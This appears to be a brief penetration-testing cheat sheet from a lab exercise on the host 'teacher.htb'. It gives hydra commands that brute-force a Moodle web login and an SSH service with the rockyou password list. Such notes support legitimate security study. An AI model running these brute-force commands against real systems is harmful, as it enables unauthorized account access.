_____


![Captura](../../assets/images/reference/7d082fcfccf37a5e1ac3.png)

```bash
hydra -l admin -P rockyou.txt teacher.htb http-post-form "/moodle/login/index.php:anchor=&username=^USER^&password=^PASS^:Invalid Login" -F
```

- -t 64

# Brute Force


```bash
hydra -l user -P /usr/share/seclists/rockyou.txt ssh://$IP
```
